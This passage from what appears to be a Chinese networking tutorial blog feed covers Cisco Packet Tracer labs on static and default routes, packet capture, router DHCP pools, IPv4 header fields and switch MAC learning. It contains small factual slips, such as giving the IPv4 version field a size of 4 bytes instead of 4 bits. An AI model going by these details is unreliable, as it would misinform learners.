1/0代表是从路由器f1/0接口出去的</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\路由器基础相关知识19.webp" alt=""></p><p>这里还有一种写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route 192.168.100.0 255.255.255.0 192.168.5.2</span><br></pre></td></tr></table></figure><p>这个唯一的区别就是最后的192.168.5.2</p><p>我们看一下这个图</p><p><img src="\media\2023\01\路由器基础相关知识20.webp" alt=""></p><p>可以看见192.168.5.2这个IP的接口，连着f1/0，而且只有f1/0这一个接口连着192.168.5.2接口，所以可以通过这么写找到接口</p><p>R1配置完后配置R2</p><h3 id="2-检查是否连通"><a href="#2-检查是否连通" class="headerlink" title="2. 检查是否连通"></a>2. 检查是否连通</h3><p>全部配置好后我们拿PC1去ping一下</p><p><img src="\media\2023\01\路由器基础相关知识21.webp" alt=""></p><p>发现它一共发了5个包，结果只发过去1个，因为我们刚配置的路由表，它找路由有一个过程，我们再ping一下试试</p><p><img src="\media\2023\01\路由器基础相关知识22.webp" alt=""></p><p>可以看到第二次的时候就可以正常的ping通了</p><h3 id="3-查看信息"><a href="#3-查看信息" class="headerlink" title="3. 查看信息"></a>3. 查看信息</h3><p>我们先查看一下MAC信息，把文本补全</p><p>和交换机一样，先看一下PC1的f0/0的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show int f0/0</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\路由器基础相关知识23.webp" alt=""></p><p>然后添加上去就行</p><p><img src="\media\2023\01\路由器基础相关知识24.webp" alt=""></p><p>其他同理</p><p><img src="\media\2023\01\路由器基础相关知识25.webp" alt=""></p><h3 id="4-抓包-PC1访问PC2"><a href="#4-抓包-PC1访问PC2" class="headerlink" title="4. 抓包(PC1访问PC2)"></a>4. 抓包(PC1访问PC2)</h3><p>我们可以右击一条链路来抓包</p><p>比如我现在想要抓PC1到R1这条链路的包，就右击链路</p><p><img src="\media\2023\01\路由器基础相关知识26.webp" alt=""></p><p>他就会自动打开wireshark</p><p><img src="\media\2023\01\路由器基础相关知识27.webp" alt=""></p><p>我们三条线路全开起来</p><p><img src="\media\2023\01\路由器基础相关知识28.webp" alt=""></p><p>抓包全开起来后，我们来用PC1去ping PC2</p><h4 id="1-PC1到R1"><a href="#1-PC1到R1" class="headerlink" title="(1) PC1到R1"></a>(1) PC1到R1</h4><p>我们先看PC1到R1这条链路</p><p>我们是执行了ping的操作，ping用的是ICMP协议，所以我们就直接看ICMP就行了。</p><p><img src="\media\2023\01\路由器基础相关知识29.webp" alt=""></p><p>双击打开一个包</p><p><img src="\media\2023\01\路由器基础相关知识30.webp" alt=""></p><p>我们可以看到物理层和网络层的信息，我们看一下物理层</p><p>源MAC地址和我们看的一样，这个目的MAC是R1的f0/0接口的MAC地址</p><p>我们再看一下网络层</p><p>源IP是PC1的IP，目的IP是PC2的IP。</p><h4 id="2-R1到R2"><a href="#2-R1到R2" class="headerlink" title="(2) R1到R2"></a>(2) R1到R2</h4><p><img src="\media\2023\01\路由器基础相关知识31.webp" alt=""></p><p>可以看到，网络层没怎么变，物理层的源MAC和目的MAC变了</p><p>源MAC变成了R1的f1/0接口，目的MAC变成了R2的f1/0接口。这就是重新进行了二层封装</p><h4 id="3-R2到PC2"><a href="#3-R2到PC2" class="headerlink" title="(3) R2到PC2"></a>(3) R2到PC2</h4><p>从R2到PC2后，P2会向PC1做回应，如图</p><p><img src="\media\2023\01\路由器基础相关知识32.webp" alt=""></p><p>request和reply</p><p>我们看报文</p><p><img src="\media\2023\01\路由器基础相关知识33.webp" alt=""></p><p>可以看见，在同一路程中，比如在PC1到PC2这个路程，我们的网络层IP地址基本上没怎么变，变的只是二层的MAC地址。当路程变成了PC2到PC1时，三层的IP地址才会变，同时MAC也变。</p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="(4) 总结"></a>(4) 总结</h4><p>PC1访问PC2</p><p>PC1会先向R1发送数据。</p><p>当R1收到数据报文后，会解封到网络层，查看目的IP是否可到，如果可以到转发到对应接口，重新进行二层封装。源MAC变成了R1的f1/0接口MAC地址，目的MAC变成了R2的F1/0解口MAC地址。</p><p>然后再发给R2</p><p>当R2收到数据报文后，会解封到网络层，查看目的IP是否可到，由于目标主机和自己是同一网络，那就一定可到。将数据交给对应接口，重新进行二层封装，源MAC变成R2的f0/0接口MAC，目的MAC变成了PC2的MAC。</p><p>路由器在转发数据包的封装过程中，源IP和目的IP是没有发生变化的，源MAC和目的MAC是一直在发生变化的，因为路由器会重新进行二层封装</p><h2 id="三-静态路由"><a href="#三-静态路由" class="headerlink" title="三. 静态路由"></a>三. 静态路由</h2><p>上面提到了静态路由，我们简单再说一下</p><p>静态路由是由管理员手工配置，是单向，缺乏灵活性。</p><p>其中静态路由还有一种特殊的叫做默认路由，它这里是直接指定目标为任何地方</p><h3 id="1-静态路由的配置"><a href="#1-静态路由的配置" class="headerlink" title="1. 静态路由的配置"></a>1. 静态路由的配置</h3><h4 id="1-配置静态路由"><a href="#1-配置静态路由" class="headerlink" title="(1) 配置静态路由"></a>(1) 配置静态路由</h4><p>我们先写一下配置静态路由的格式，其实上面已经配置过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上面出现的：</span><br><span class="line">ip route 192.168.100.0 255.255.255.0 fastEthernet 1/0</span><br><span class="line">也可以写成</span><br><span class="line">ip route 192.168.100.0 255.255.255.0 192.168.5.2</span><br><span class="line"></span><br><span class="line">ip route 目标网络所处的网段 目标的子网掩码 下一个路由器的接口的IP地址(也可以是发往下一个路由器的本地接口)</span><br></pre></td></tr></table></figure><h4 id="2-配置默认路由"><a href="#2-配置默认路由" class="headerlink" title="(2) 配置默认路由"></a>(2) 配置默认路由</h4><p>默认路由就是静态路由的特殊形式，所以形式一样，就是这个IP地址和子网掩码不大一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ip route 0.0.0.0 0.0.0.0 下一个路由器的接口的IP地址(也可以是发往下一个路由器的本地接口)</span><br><span class="line"></span><br><span class="line">第一个0.0.0.0代表了所有网络，第二个0.0.0.0代表了子网掩码</span><br><span class="line"></span><br><span class="line">比如</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 fastEthernet 1/0</span><br><span class="line">或者</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.5.2</span><br></pre></td></tr></table></figure><h4 id="3-配置路由条目"><a href="#3-配置路由条目" class="headerlink" title="(3) 配置路由条目"></a>(3) 配置路由条目</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">思科设备</span><br><span class="line">show ip route</span><br><span class="line"></span><br><span class="line">华为设备</span><br><span class="line">display ip route</span><br></pre></td></tr></table></figure><h3 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h3><p>我们先搭建这么一个网络，如图所示</p><p><img src="\media\2023\01\路由器基础相关知识34.webp" alt=""></p><p>然后再把每个设备的IP按照上图所示给加上</p><p>这个配置IP其实没啥，主要是看好接口对应哪个IP，别看混了。记得把接口打开，网关别忘配置了</p><h4 id="1-PC0访问PC1，走R1-R3-R2"><a href="#1-PC0访问PC1，走R1-R3-R2" class="headerlink" title="(1) PC0访问PC1，走R1-R3-R2"></a>(1) PC0访问PC1，走R1-R3-R2</h4><p>这么走</p><p><img src="\media\2023\01\路由器基础相关知识35.webp" alt=""></p><p>我需要把除了R1到R2链路以外的接口打开</p><p>我们配置一下路由表</p><p>先配置R1，在全局模式下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route 192.168.20.0 255.255.255.0 10.0.0.2</span><br></pre></td></tr></table></figure><p>我们可以看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show ip route</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\路由器基础相关知识36.webp" alt=""></p><p>这里的L（Local）代表着本地路由，C（Conect）代表直连路由，S（Static）代表静态路由</p><p>我们这里是配置了一个静态路由，所以这里显示的是S，其他的以后讲</p><p>配置R3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route 192.168.20.0 255.255.255.0 20.0.0.2</span><br></pre></td></tr></table></figure><p>R2不用再配置了，当然你也可以配置默认路由</p><p>这样从PC0到PC1的道路就通了，但是PC1会给PC0相应，所以还得继续想之前那样配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R2</span><br><span class="line">ip route 192.168.10.0 255.255.255.0 20.0.0.1</span><br><span class="line"></span><br><span class="line">R3</span><br><span class="line">ip route 192.168.10.0 255.255.255.0 10.0.0.1</span><br></pre></td></tr></table></figure><p>这样就全部完事了</p><p>我们拿PC0 ping一下PC1</p><p><img src="\media\2023\01\路由器基础相关知识37.webp" alt=""></p><p>成功！</p><p>这里有第一次ping可能ping不通，再试一次就行了</p><p>这里所有的路由配置，都可以配置成默认路由，这里不用试了，看我的就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route 0.0.0.0 0.0.0.0 这里和上面的一样</span><br></pre></td></tr></table></figure><p>配置后会有这么一条东西</p><p><img src="\media\2023\01\路由器基础相关知识41.webp" alt=""></p><p>他的意思是：没有网关的默认路由，如果不是点到点接口，可能会影响性能。</p><h4 id="2-跟踪功能"><a href="#2-跟踪功能" class="headerlink" title="(2) 跟踪功能"></a>(2) 跟踪功能</h4><p>在查看 -&gt; 仿真模式</p><p><img src="\media\2023\01\路由器基础相关知识38.webp" alt=""></p><p>他会在右面有一个这样的东西</p><p><img src="\media\2023\01\路由器基础相关知识39.webp" alt=""></p><p>我们这时候再ping一次，会发现它停止了</p><p><img src="\media\2023\01\路由器基础相关知识40.webp" alt=""></p><p>这个功能类似WEB调试中的debug，我们点击右下角的箭头可以继续，这样你就可以看到整个过程了</p><h2 id="四-路由器配置DHCP"><a href="#四-路由器配置DHCP" class="headerlink" title="四. 路由器配置DHCP"></a>四. 路由器配置DHCP</h2><p>在路由器上配置DHCP的目的是：使客户机可以通过路由器所提供的DHCP服务获取到IP地址</p><h3 id="1-DHCP"><a href="#1-DHCP" class="headerlink" title="1. DHCP"></a>1. DHCP</h3><p>DHCP是动态主机配置协议，主要是为客户机提供TCP/IP参数：IP地址、子网掩码、网关、DNS服务器地址</p><h3 id="2-配置思路"><a href="#2-配置思路" class="headerlink" title="2. 配置思路"></a>2. 配置思路</h3><h4 id="1-定义DHCP地址池"><a href="#1-定义DHCP地址池" class="headerlink" title="(1) 定义DHCP地址池"></a>(1) 定义DHCP地址池</h4><p>池的名字</p><p>指定分配的网络范围：网络地址和子网掩码</p><p>指定默认网关</p><p>指定的DNS服务器地址</p><h4 id="2-指定保留地址"><a href="#2-指定保留地址" class="headerlink" title="(2) 指定保留地址"></a>(2) 指定保留地址</h4><p>我们如果有想要保留，即不给主机使用的IP，有另外使用，可以指定保留地址</p><h4 id="3-例子"><a href="#3-例子" class="headerlink" title="(3) 例子"></a>(3) 例子</h4><p>我们看这个网络</p><p><img src="\media\2023\01\路由器基础相关知识42.webp" alt=""></p><p>我们两个主机先不用分配IP，就整两个路由器就行了，把接口IP分配好，打开，路由表添加条目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(1) 静态路由：</span><br><span class="line">路由器1</span><br><span class="line">ip route 192.168.20.0 255.255.255.0 g0/1</span><br><span class="line"></span><br><span class="line">路由器2</span><br><span class="line">ip route 192.168.10.0 255.255.255.0 g0/1</span><br><span class="line"></span><br><span class="line">(2) 当然用默认路由也行：</span><br><span class="line">路由器1</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 g0/1</span><br><span class="line"></span><br><span class="line">路由器2</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 g0/1</span><br><span class="line"></span><br><span class="line">这两种随便选一个即可</span><br></pre></td></tr></table></figure><p>完事后就是要配置DHCP地址池了</p><p>先看路由器1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">ip dhcp pool trtyr  // 定义一个叫trtyr的地址池</span><br></pre></td></tr></table></figure><p>回车，这样就进来了</p><p><img src="\media\2023\01\路由器基础相关知识43.webp" alt=""></p><p>之后配置网络范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network 192.168.10.0 255.255.255.0  // 配置网段为192.168.10.0，子网掩码是255.255.255.0</span><br></pre></td></tr></table></figure><p>然后指定默认的路由器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-router 192.168.10.254  // 接网关地址</span><br></pre></td></tr></table></figure><p>指定DNS地址，但是我们现在没有域名，指不指定无所谓，我们要是指定的话这样指定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns-server 114.114.114.114  // 指定DNS地址为114.114.114.114</span><br></pre></td></tr></table></figure><p>整个过程图片</p><p><img src="\media\2023\01\路由器基础相关知识45.webp" alt=""></p><p>我们试一下，把PC0设置为DHCP模式</p><p><img src="\media\2023\01\路由器基础相关知识44.webp" alt=""></p><p>可以看见成功了</p><p>同样的把路由器2也配置上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip dhcp pool trtyr  // 定义一个叫trtyr的地址池</span><br><span class="line">network 192.168.20.0 255.255.255.0  // 配置网段为192.168.20.0，子网掩码是255.255.255.0</span><br><span class="line">default-router 192.168.20.254  // 接网关地址</span><br><span class="line">dns-server 114.114.114.114  // 指定DNS地址为114.114.114.114</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\路由器基础相关知识46.webp" alt=""></p><p>看一下PC1</p><p><img src="\media\2023\01\路由器基础相关知识47.webp" alt=""></p><p>这个也配置好了，我们试一下用PC0 ping PC1</p><p><img src="\media\2023\01\路由器基础相关知识48.webp" alt=""></p><p>可以看到成功ping通</p><p>我们如果想要加上保留地址的话，可以这样，我拿路由器1举例</p><p>我们先看一下现在两台主机的IP</p><p>PC0：192.168.10.1</p><p>PC1：192.168.20.1</p><p>我们现在想要在路由器1中，192.168.10.1到192.168.10.50这个范围为保留地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip dhcp excluded-address 192.168.10.1 192.168.10.50</span><br></pre></td></tr></table></figure><p>我们现在看一下PC0的IP</p><p>这时候会显示DHCP获取失败，我们重新获取一下就行</p><p><img src="\media\2023\01\路由器基础相关知识49.webp" alt=""></p><p>成功设置保留地址</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP数据包的格式</title>
      <link href="/2023/02/16/7/"/>
      <url>/2023/02/16/7/</url>
      
        <content type="html"><![CDATA[<h2 id="一-网络层回顾"><a href="#一-网络层回顾" class="headerlink" title="一. 网络层回顾"></a>一. 网络层回顾</h2><p>路由器是属于三层设备（网络层）设备。</p><p>网络层的功能是来进行逻辑地址（IP地址）寻址，实现不同网络（网络地址不等或者说是内网和外网的分割，<strong>注意内网的IP地址是无法在外网上进行路由</strong>）直接的路径选择。</p><p>逻辑地址寻址就是去查找目的是否可以到达，如果可以到达，选择一条最优的路径，如果不能到达，直接返回给发送方一个消息</p><p>网络层所传输的PDU（传输数据单元）是数据包（IP数据包）</p><h2 id="二-网络层IP数据包的格式"><a href="#二-网络层IP数据包的格式" class="headerlink" title="二. 网络层IP数据包的格式"></a>二. 网络层IP数据包的格式</h2><h3 id="1-IPV4格式"><a href="#1-IPV4格式" class="headerlink" title="1. IPV4格式"></a>1. IPV4格式</h3><p><img src="\media\2023\01\IP数据包的格式1.webp" alt=""></p><p>它由两个部分组成，首部和数据部分。</p><p>首部单单由源IP地址和目的IP地址组成，它还有其他东西</p><h4 id="1-版本"><a href="#1-版本" class="headerlink" title="(1) 版本"></a>(1) 版本</h4><p>版本里面主要包含了，你当前使用的IP版本是什么。版本是4就是叫做IPV4，版本是6就叫做IPV6</p><p>它占了4个字节</p><h4 id="2-首部长度"><a href="#2-首部长度" class="headerlink" title="(2) 首部长度"></a>(2) 首部长度</h4><p>由于IP数据报文的首部有一个 “可选字段” 的存在，导致首部长度是可变的，所以需要去定义一下首部长度</p><h4 id="3-区分服务（服务质量-优先级和服务类型）"><a href="#3-区分服务（服务质量-优先级和服务类型）" class="headerlink" title="(3) 区分服务（服务质量/优先级和服务类型）"></a>(3) 区分服务（服务质量/优先级和服务类型）</h4><p>为了保障更好的服务，主要是在IP层做QoS</p><blockquote><p>QoS指一个网络能够利用各种基础技术，为指定的网络通信提供更好的服务能力，是网络的一种安全机制， 是用来解决网络延迟和阻塞等问题的一种技术。QoS的保证对于容量有限的网络来说是十分重要的，特别是对于流多媒体应用，例如VoIP和IPTV等，因为这些应用常常需要固定的传输率，对延时也比较敏感。</p><p>来自<a href="https://baike.baidu.com/item/qos/404053">qos_百度百科 (baidu.com)</a></p></blockquote><p>在一个公司的网络中，这个公司网络总共从运营商那面拉过来的带宽是50M，但是公司员工可能有100位。经常有员工在上班的时候摸鱼，比如打游戏，下载奇奇怪怪的东西，看1080P的电影，整的公司网络特别卡。这个时候老板正在会议室开视频会议，卡的要死，网络有特别大的延迟和堵塞。</p><p>向上面说的视频会议这种，还有客服电话等，是需要一个固定的能稳定通信的带宽，我们可以通过QoS来设置对应的服务质量。</p><p>这个通常是运维来干的。</p><h4 id="4-总长度"><a href="#4-总长度" class="headerlink" title="(4) 总长度"></a>(4) 总长度</h4><p>主要用来标识整个数据包的长度</p><p>前面的是首部长度，这个是包括了首部和数据部分的</p><h4 id="5-标识、标志、片位移（段偏移量）"><a href="#5-标识、标志、片位移（段偏移量）" class="headerlink" title="(5) 标识、标志、片位移（段偏移量）"></a>(5) 标识、标志、片位移（段偏移量）</h4><p>这三个是连在一起的，主要是用于标识上层来的数据到IP层会被分片，这几个字段用来对数据包进行标识，使数据到达目的端重组的时候不会乱序</p><h4 id="6-生存时间（TTL值）"><a href="#6-生存时间（TTL值）" class="headerlink" title="(6) 生存时间（TTL值）"></a>(6) 生存时间（TTL值）</h4><p>TTL这个感觉有点熟悉哈，好像在哪里看见过</p><p><img src="\media\2023\01\IP数据包的格式2.webp" alt=""></p><p>就是这个东西</p><p>这里TTL我们称之为生命周期或者叫生存时间，他是为了防止这个数据包一直永远的传。如果没有TTL或者TTL为0的时候，只要目的可到，他就会一直传递数据</p><p>这个TTL还有一种说法是：数据包在路由器转发消耗时间的如果小于1秒，TTL就会减1，减没了就会丢掉</p><h4 id="7-协议"><a href="#7-协议" class="headerlink" title="(7) 协议"></a>(7) 协议</h4><p>标识上层数据用的是什么协议，网络层的上一层就是传输层，这个协议就是TCP或UDP。</p><p>TCP用6标识，UDP用17标识</p><h4 id="8-首部校验和"><a href="#8-首部校验和" class="headerlink" title="(8) 首部校验和"></a>(8) 首部校验和</h4><p>这个主要是校验数据报文的首部</p><h4 id="9-源地址"><a href="#9-源地址" class="headerlink" title="(9) 源地址"></a>(9) 源地址</h4><p>发送方的IP地址</p><h4 id="10-目的地址"><a href="#10-目的地址" class="headerlink" title="(10) 目的地址"></a>(10) 目的地址</h4><p>接收方的IP地址</p><h4 id="11-可选字段"><a href="#11-可选字段" class="headerlink" title="(11) 可选字段"></a>(11) 可选字段</h4><p>一般根据实际情况来定，咱们就不用管他</p><h4 id="12-其他"><a href="#12-其他" class="headerlink" title="(12) 其他"></a>(12) 其他</h4><p>我这里是简单介绍以下，想要具体的可以看这个</p><p><a href="https://trtyr.top/IPV4/IP%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.html">IP报文格式 (trtyr.top)</a></p><h3 id="2-IPV6格式"><a href="#2-IPV6格式" class="headerlink" title="2. IPV6格式"></a>2. IPV6格式</h3><p>由于IPV6还未完全普及，而且和IPV4也差不多，就是有些地方不大一样，我这里放一个HTML里面讲的挺详细的，各位了解一下。</p><p><a href="https://trtyr.top/IPV6/IPv6%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.html">IPv6报文格式 (trtyr.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交换机基础知识详解</title>
      <link href="/2023/02/16/20/"/>
      <url>/2023/02/16/20/</url>
      
        <content type="html"><![CDATA[<h2 id="一-以太网交换原理"><a href="#一-以太网交换原理" class="headerlink" title="一. 以太网交换原理"></a>一. 以太网交换原理</h2><h3 id="1-早期的网络（HUB）"><a href="#1-早期的网络（HUB）" class="headerlink" title="1. 早期的网络（HUB）"></a>1. 早期的网络（HUB）</h3><p>早期的网络式共享式的网络，它是由集线器（HUB）相连</p><p><strong>集线器：</strong></p><p>集线器的主要功能是对接收到的信号进行再生整形放大，以扩大网络的传输距离，同时把所有节点集中在以它为中心的节点上。</p><p>集线器与网卡、网线等传输介质一样，属于局域网中的基础设备，采用CSMA/CD（即带冲突检测的载波监听多路访问技术）介质访问控制机制。</p><p>集线器每个接口简单的收发比特，收到1就转发1，收到0就转发0，不进行碰撞检测</p><p>通过集线器相连的设备可以看作在一根线上的</p><p>它是一个冲突域的网络，或者叫做广播域。如下图：</p><p><img src="\media\2023\01\交换机有关知识详解1.webp" alt=""></p><p>集线器的主要目的就是放大信号，当一个主机想要发送一个数据，先发给集线器，然后经过集线器放大信号，从所有的接口向所有的设备像广播一样发送数据。所以称为一个广播域</p><p>那么如果现在A向B发送数据，同时B又向A发送数据，这时候就有冲突，就形成了冲突域。</p><p>如果这张图看的不清楚的话，我们上面说过可以看作是一根线上的，可以画一个总线型拓扑：</p><p><img src="\media\2023\01\交换机有关知识详解2.webp" alt=""></p><p>这样看得就能方便点。</p><p>当A向D发送数据，C向B发送数据，中间的那个地方数据就会发生冲突，形成冲突域。</p><p><img src="\media\2023\01\交换机有关知识详解3.webp" alt=""></p><p>然后为了解决这个问题就有了CSMA/CD，即载波监听多路访问/冲突检测技术。</p><p>除了冲突域的问题以外它还有带宽上的问题。</p><p>如果带宽是100M，那么在传送数据的时候，发生冲突的时候它还会分摊带宽，导致本来100M的带宽，实际上用的却是分摊过的。</p><p><img src="\media\2023\01\交换机有关知识详解4.webp" alt=""></p><p>就像这样，总的是100M，然后每条线路确是25M</p><h3 id="2-交换式网络"><a href="#2-交换式网络" class="headerlink" title="2. 交换式网络"></a>2. 交换式网络</h3><h4 id="1-交换式网络"><a href="#1-交换式网络" class="headerlink" title="(1) 交换式网络"></a>(1) 交换式网络</h4><p>由于共享式网络的种种缺点，人们后来研发出交换机就把它弃掉了。</p><p>现在采用的是基于以太网交换机的交换式网络</p><p>交换机是广播域类型的网络。</p><p>说了那么多广播，那么什么是广播？</p><p>广播就是一种信息的传播方式。我们应该都见过村里或者学校的广播，一个大喇叭或者一个大音响，有什么通知的时候整个村或学校都能听见。</p><p>这种一个人向全村人，全校人发送信息，即一对多的信息方式就是广播。</p><p>除了广播还有一个单播，就是像传音一样，一对一发送数据</p><p>用交换机所连接的网络，我们称是一个广播域内的。</p><p><img src="\media\2023\01\交换机有关知识详解5.webp" alt=""></p><p>交换机上的接口是有交换速率的。</p><p>如果我们是有100M的带宽，那么每一条的速率都是100M</p><p><img src="\media\2023\01\交换机有关知识详解6.webp" alt=""></p><p>这就有点像串联和并联的关系。共享式网络是串联，交换式网络是并联，所以能够解决串联产生的分摊带宽的情况。</p><h4 id="2-MAC表"><a href="#2-MAC表" class="headerlink" title="(2) MAC表"></a>(2) MAC表</h4><p><img src="\media\2023\01\交换机有关知识详解7.webp" alt=""></p><p>交换机是数据链路层的设备。</p><p>主机A给主机B发送数据，当数据发送到交换机这里的时候，交换机会去看数据帧中源MAC和目的MAC地址。然后根据源和目的MAC地址，比对交换机里头的MAC表。比对后再决定我们的这个数据到底以什么样的方式进行转发。</p><p>MAC表中主要维护的是<strong>发送方的MAC和接口的对应关系</strong></p><p>当主机A向主机B发送数据的时候，源MAC地址是主机A的，目的MAC地址是主机B的。</p><p>当数据通过交换机的1号口进来，交换机会看数据帧头部中的源MAC地址和目的MAC地址，然后对照MAC表，去看主机A的MAC地址有没有记录在MAC表中，如果没有就记录主机A的MAC地址</p><p>它这个记录是这样的：主机A ——— 接口1</p><p>查看源MAC完后，然后继续查看目的MAC地址，看它有没有在MAC地址表中记录，如果没有，那么交换机就不知道从哪个接口转发出去，它就直接从除接受接口外的所有的接口转发，这种方式就是我们上面讲的广播。</p><p>在这张图中就是，向接口2和接口3转发数据，即虽然是A向B发送数据，但实际上B和C都接收到了来自A的数据。</p><p>发送数据后，主机C解封后会发现，哎，这个数据不是给我的。它就会把这个数丢弃。</p><p>这里的这个数据丢弃就涉及到了网卡的知识。我们的网卡通常来说是非混杂模式，这个模式下的网卡是不会去接收不是发给自己的数据。如果是混杂模式的话它就会统统接收，即接收任何数据</p><p>主机C把数据丢弃，主机B一看是给自己，他就会回应给主机A，然后发送数据到交换机的时候，源MAC地址就成了主机B的，然后还是像记录主机A那样记录：主机B ——— 接口2</p><p>然后发现目标MAC在1号接口，直接通过1号接口发给主机A</p><p>主机B向主机A回应的这个过程就是单播转发</p><h4 id="3-总结"><a href="#3-总结" class="headerlink" title="(3) 总结"></a>(3) 总结</h4><p>交换机收到一个数据帧后，首先学习源MAC地址；接着广播数据帧，接收方单播回应，其他主机丢弃；下一次转发数据直接以单播凡是转发数据</p><p><img src="\media\2023\01\交换机有关知识详解8.webp" alt=""></p><h3 id="3-交换机的工作模式"><a href="#3-交换机的工作模式" class="headerlink" title="3. 交换机的工作模式"></a>3. 交换机的工作模式</h3><h4 id="1-单工"><a href="#1-单工" class="headerlink" title="(1) 单工"></a>(1) 单工</h4><p><strong>单工：数据报只能单向传输</strong></p><p>一方固定为发送端，一方则固定为接收端</p><p>A可以向B发送数据，但是B不可以向A发送数据</p><h4 id="2-半双工"><a href="#2-半双工" class="headerlink" title="(2) 半双工"></a>(2) 半双工</h4><p><strong>半双工：数据可以双向传输，但不能通过进行</strong></p><p>A可以向B发送数据，B也可以向A发送数据。但是A向B发送数据的时候，B不能向A发送数据；B向A发送数据的时候，A不能向B发送数据；</p><h4 id="3-全双工"><a href="#3-全双工" class="headerlink" title="(3) 全双工"></a>(3) 全双工</h4><p><strong>全双工：数据可以双向，并且可以同时进行</strong></p><p>A和B之间想怎么传就怎么传</p><p>现在交换机中通常全是全双工，不建议修改</p><h2 id="二-交换机的基本配置"><a href="#二-交换机的基本配置" class="headerlink" title="二. 交换机的基本配置"></a>二. 交换机的基本配置</h2><h3 id="1-思科设备命令行基础"><a href="#1-思科设备命令行基础" class="headerlink" title="1. 思科设备命令行基础"></a>1. 思科设备命令行基础</h3><p>要想进入设备的命令行界面，需要设备支持命令行界面，需要用超级终端软件进行连接。</p><p>要想查看设备是否支持命令行界面，去查看设备上的接口是否有一个叫console，有的话还需要有一个console线</p><p>超级终端软件有 putty，secret CRT，xshell等</p><h3 id="2-命令行基础"><a href="#2-命令行基础" class="headerlink" title="2. 命令行基础"></a>2. 命令行基础</h3><p>我们在思科模拟器上拿出来一个交换机和一个主机</p><p><img src="\media\2023\01\交换机有关知识详解9.webp" alt=""></p><p>找到console线</p><p><img src="\media\2023\01\交换机有关知识详解10.webp" alt=""></p><p>用console线将交换机和PC主机连上</p><p>PC主机连 PS232 接口，交换机连console接口</p><p><img src="\media\2023\01\交换机有关知识详解11.webp" alt=""></p><p>然后打开PC（点击一下）</p><p><img src="\media\2023\01\交换机有关知识详解12.webp" alt=""></p><p>打开终端，点击桌面</p><p><img src="\media\2023\01\交换机有关知识详解13.webp" alt=""></p><p>这里就能看到端口设置了，点击确定就能进入电脑的终端，可以在这里看到交换机的信息，也可以在这里对交换机进行操作。</p><p><img src="\media\2023\01\交换机有关知识详解14.webp" alt=""></p><p>当然我们这是在模拟器中，想要更改交换机配置的话直接点击交换机就行了</p><p><img src="\media\2023\01\交换机有关知识详解15.webp" alt=""></p><h4 id="1-思科设备上的命令模式："><a href="#1-思科设备上的命令模式：" class="headerlink" title="(1) 思科设备上的命令模式："></a>(1) 